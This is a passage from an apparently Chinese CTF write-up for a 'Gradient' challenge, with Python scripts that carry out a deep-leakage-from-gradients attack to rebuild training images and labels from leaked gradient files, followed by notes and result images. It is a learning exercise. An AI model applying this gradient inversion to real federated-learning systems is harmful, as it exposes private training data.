class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># r1cknet_grad_attack.py</span></span><br><span class=\"line\"><span class=\"comment\"># 单独训练某个样本</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> R1ckNet</span><br><span class=\"line\"><span class=\"keyword\">from</span> utils <span class=\"keyword\">import</span> label_to_onehot, cross_entropy_for_onehot</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\">parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Deep Leakage from Gradients using R1ckNet.&#x27;</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--grad&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Path to the .grad file&#x27;</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--out&#x27;</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>, default=<span class=\"literal\">None</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Path to save recovered image&#x27;</span>)</span><br><span class=\"line\">args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">device = torch.device(<span class=\"string\">&quot;cuda&quot;</span> <span class=\"keyword\">if</span> torch.cuda.is_available() <span class=\"keyword\">else</span> <span class=\"string\">&quot;cpu&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Running on&quot;</span>, device)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. 加载原始梯度</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(args.grad, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    origin_grad = torch.load(f)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. 初始化模型并加载已有权重</span></span><br><span class=\"line\"><span class=\"comment\">#net = R1ckNet().to(device)</span></span><br><span class=\"line\"><span class=\"comment\">#这个也可以不用注释掉，就是和后面导入模型有点重复</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载模型的state_dict</span></span><br><span class=\"line\">net = torch.load(<span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&quot;</span>, </span><br><span class=\"line\">                 map_location=device,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">net.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. 初始化 dummy 数据和标签</span></span><br><span class=\"line\">dummy_data = torch.ones((<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"><span class=\"comment\"># 之前迭代损失很高就是因为没读懂提示，原来提示的作用是为了让初始化图像时尽可能接近恢复出的图像，这样就能降低损失。在比较少的迭代次数也能有效恢复。</span></span><br><span class=\"line\"><span class=\"comment\"># 图片背景是白色，初始化为全白图像，即采用 torch.ones。</span></span><br><span class=\"line\"><span class=\"comment\"># 之前一直模仿论文代码写的是 torch.rands，训练恢复的效果就很差。</span></span><br><span class=\"line\">dummy_label = torch.randn((<span class=\"number\">1</span>, <span class=\"number\">100</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 LBFGS 优化器</span></span><br><span class=\"line\">optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class=\"line\">history = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. 迭代优化以恢复图像和标签</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">        optimizer.zero_grad()</span><br><span class=\"line\">        <span class=\"comment\"># 进行前向传播获取预测结果</span></span><br><span class=\"line\">        pred = net(dummy_data)</span><br><span class=\"line\">        <span class=\"comment\">#print(f&quot;Prediction shape: &#123;pred.shape&#125;&quot;)  # 打印预测结果的形状</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 使用 softmax 转换标签为概率分布</span></span><br><span class=\"line\">        soft_label = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算交叉熵损失</span></span><br><span class=\"line\">        loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算损失对模型参数的梯度</span></span><br><span class=\"line\">        grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 计算恢复梯度与原始梯度之间的差异</span></span><br><span class=\"line\">        diff = <span class=\"built_in\">sum</span>(((g_rec - g_orig) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() <span class=\"keyword\">for</span> g_rec, g_orig <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(grads, origin_grad))</span><br><span class=\"line\">        diff.backward()  <span class=\"comment\"># 反向传播计算差异的梯度</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\">    optimizer.step(closure)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> it % <span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">        loss_val = closure().item()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Iter <span class=\"subst\">&#123;it:3d&#125;</span> | Loss: <span class=\"subst\">&#123;loss_val:<span class=\"number\">.4</span>f&#125;</span>&quot;</span>)</span><br><span class=\"line\">        history.append(dummy_data[<span class=\"number\">0</span>].detach().cpu())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. 可视化中间恢复图像</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, img <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(history[:<span class=\"number\">30</span>]):</span><br><span class=\"line\">    plt.subplot(<span class=\"number\">3</span>, <span class=\"number\">10</span>, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">    plt.imshow(img.permute(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>).clip(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">    plt.title(<span class=\"string\">f&quot;it=<span class=\"subst\">&#123;i * <span class=\"number\">10</span>&#125;</span>&quot;</span>)</span><br><span class=\"line\">    plt.axis(<span class=\"string\">&#x27;off&#x27;</span>)</span><br><span class=\"line\">plt.tight_layout()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 自动命名图像文件</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> args.out:</span><br><span class=\"line\">    plt.savefig(args.out)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    grad_filename = os.path.splitext(os.path.basename(args.grad))[<span class=\"number\">0</span>]  <span class=\"comment\"># 提取不带扩展名的文件名</span></span><br><span class=\"line\">    out_path = <span class=\"string\">f&quot;<span class=\"subst\">&#123;grad_filename&#125;</span>.png&quot;</span></span><br><span class=\"line\">    plt.savefig(out_path)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Image saved to <span class=\"subst\">&#123;out_path&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 6. 输出恢复标签</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">    final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">    recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br><span class=\"line\"><span class=\"comment\"># 这个标签有大用，之前看到输出结果一直以为是迭代过程中一个比较突出的数值，还是学得太粗略了。</span></span><br></pre></td></tr></table></figure></div>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># model.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">R1ckNet</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, in_channels=<span class=\"number\">3</span>, conv1_out=<span class=\"number\">12</span>, conv2_out=<span class=\"number\">12</span>, conv3_out=<span class=\"number\">12</span>,</span></span><br><span class=\"line\"><span class=\"params\">                 conv4_out=<span class=\"number\">16</span>, fc_in=<span class=\"number\">1024</span>, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.body = nn.Sequential(</span><br><span class=\"line\">            nn.Conv2d(in_channels, conv1_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv1_out, conv2_out, <span class=\"number\">5</span>, stride=<span class=\"number\">2</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv2_out, conv3_out, <span class=\"number\">5</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">2</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Conv2d(conv3_out, conv4_out, <span class=\"number\">3</span>, stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>),</span><br><span class=\"line\">            nn.Sigmoid(),</span><br><span class=\"line\">            nn.Flatten()</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.fc = nn.Linear(fc_in, num_classes)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.body(x)</span><br><span class=\"line\">        x = x.view(x.size(<span class=\"number\">0</span>),-<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 展平这一步很重要，规范张量的形状以和权重矩阵的形状相匹配。感觉自己学习代码还是挺粗线条的💦💦💦</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.fc(x)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># utils.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 整数形式的分类标签转换为 One-Hot 编码。</span></span><br><span class=\"line\"><span class=\"comment\"># dummy_label是可导的，转换one-hot方便计算和预测结果之间的损失</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">label_to_onehot</span>(<span class=\"params\">target, num_classes=<span class=\"number\">100</span></span>):</span><br><span class=\"line\">    target = torch.unsqueeze(target, <span class=\"number\">1</span>)  <span class=\"comment\"># [B,1]</span></span><br><span class=\"line\">    onehot = torch.zeros(target.size(<span class=\"number\">0</span>), num_classes, device=target.device)</span><br><span class=\"line\">    onehot.scatter_(<span class=\"number\">1</span>, target, <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> onehot</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算预测结果与 one-hot 标签之间的交叉熵损失。</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cross_entropy_for_onehot</span>(<span class=\"params\">pred, target</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.mean(torch.<span class=\"built_in\">sum</span>(- target * F.log_softmax(pred, dim=-<span class=\"number\">1</span>), dim=<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># batch.py 批量训练梯度</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn.functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> R1ckNet</span><br><span class=\"line\"><span class=\"keyword\">from</span> utils <span class=\"keyword\">import</span> cross_entropy_for_onehot</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm  <span class=\"comment\"># 用于显示进度条</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 配置参数</span></span><br><span class=\"line\">GRAD_DIR = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\grads_origin&quot;</span></span><br><span class=\"line\">MODEL_PATH = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\model.pth&quot;</span></span><br><span class=\"line\">OUT_DIR = <span class=\"string\">r&quot;E:\\CTF\\SYSUCTF\\2025\\misc\\Gradient\\attachments\\gradient\\outputs1&quot;</span></span><br><span class=\"line\">os.makedirs(OUT_DIR, exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设备选择</span></span><br><span class=\"line\">device = torch.device(<span class=\"string\">&quot;cuda&quot;</span> <span class=\"keyword\">if</span> torch.cuda.is_available() <span class=\"keyword\">else</span> <span class=\"string\">&quot;cpu&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Running on&quot;</span>, device)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加载模型</span></span><br><span class=\"line\">net = torch.load(MODEL_PATH, map_location=device,weights_only=<span class=\"literal\">False</span>)</span><br><span class=\"line\">net.<span class=\"built_in\">eval</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历所有 .grad 文件</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> grad_file <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(os.listdir(GRAD_DIR)):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> grad_file.endswith(<span class=\"string\">&quot;.grad&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">    grad_path = os.path.join(GRAD_DIR, grad_file)</span><br><span class=\"line\">    out_name = os.path.splitext(grad_file)[<span class=\"number\">0</span>] + <span class=\"string\">&quot;.png&quot;</span></span><br><span class=\"line\">    out_path = os.path.join(OUT_DIR, out_name)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加载原始梯度</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(grad_path, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        origin_grad = torch.load(f)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 初始化 dummy 数据和标签</span></span><br><span class=\"line\">    dummy_data = torch.ones((<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">32</span>, <span class=\"number\">32</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    dummy_label = torch.randn((<span class=\"number\">1</span>, <span class=\"number\">100</span>), device=device, requires_grad=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class=\"line\">    history = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 迭代优化</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">closure</span>():</span><br><span class=\"line\">            optimizer.zero_grad()</span><br><span class=\"line\">            pred = net(dummy_data)</span><br><span class=\"line\">            soft_label = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">            loss = cross_entropy_for_onehot(pred, soft_label)</span><br><span class=\"line\">            grads = torch.autograd.grad(loss, net.parameters(), create_graph=<span class=\"literal\">True</span>)</span><br><span class=\"line\">            diff = <span class=\"built_in\">sum</span>(((g_rec - g_orig) ** <span class=\"number\">2</span>).<span class=\"built_in\">sum</span>() <span class=\"keyword\">for</span> g_rec, g_orig <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(grads, origin_grad))</span><br><span class=\"line\">            diff.backward()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\">        optimizer.step(closure)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> it %<span class=\"number\">10</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            loss_val = closure().item()</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Iter <span class=\"subst\">&#123;it:3d&#125;</span> | Loss: <span class=\"subst\">&#123;loss_val:<span class=\"number\">.4</span>f&#125;</span>&quot;</span>)</span><br><span class=\"line\">            history.append(dummy_data[<span class=\"number\">0</span>].detach().cpu())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 保存图像</span></span><br><span class=\"line\">    plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, img <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(history[:<span class=\"number\">30</span>]):</span><br><span class=\"line\">        plt.subplot(<span class=\"number\">3</span>, <span class=\"number\">10</span>, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        plt.imshow(img.permute(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>).clip(<span class=\"number\">0</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\">        plt.title(<span class=\"string\">f&quot;it=<span class=\"subst\">&#123;i * <span class=\"number\">10</span>&#125;</span>&quot;</span>)</span><br><span class=\"line\">        plt.axis(<span class=\"string\">&#x27;off&#x27;</span>)</span><br><span class=\"line\">    plt.tight_layout()</span><br><span class=\"line\">    plt.savefig(out_path)</span><br><span class=\"line\">    plt.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输出标签（可选）</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">        final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">        recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;<span class=\"subst\">&#123;grad_file&#125;</span> -&gt; Class: <span class=\"subst\">&#123;recovered_class&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<p>然后就能预测图像了。</p>\n<p>注意预测过程中，有些图像会因为迭代次数过大而“矫枉过正”，所以针对某些损失依旧很大的图像可以适当降低迭代次数，单独进行训练。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504223254918.png\"\n                      alt=\"image-20250504223254918\"\n                ></p>\n<p>最后恢复出了的图像如下：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"3.png\"\n                      alt=\"3\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"1.png\"\n                      alt=\"1\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"2.png\"\n                      alt=\"2\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"31.png\"\n                      alt=\"31\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"32.png\"\n                      alt=\"32\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"4.png\"\n                      alt=\"4\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"5.png\"\n                      alt=\"5\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"6.png\"\n                      alt=\"6\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"7.png\"\n                      alt=\"7\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"8.png\"\n                      alt=\"8\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"9.png\"\n                      alt=\"9\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"10.png\"\n                      alt=\"10\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"11.png\"\n                      alt=\"11\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"12.png\"\n                      alt=\"12\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"13.png\"\n                      alt=\"13\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"14.png\"\n                      alt=\"14\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"15.png\"\n                      alt=\"15\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"16.png\"\n                      alt=\"16\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"17.png\"\n                      alt=\"17\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"18.png\"\n                      alt=\"18\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"19.png\"\n                      alt=\"19\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"20.png\"\n                      alt=\"20\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"21.png\"\n                      alt=\"21\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"22.png\"\n                      alt=\"22\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"23.png\"\n                      alt=\"23\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"24.png\"\n                      alt=\"24\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"25.png\"\n                      alt=\"25\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"26.png\"\n                      alt=\"26\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"27.png\"\n                      alt=\"27\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"28.png\"\n                      alt=\"28\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"29.png\"\n                      alt=\"29\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"30.png\"\n                      alt=\"30\" style=\"zoom:25%;\" \n                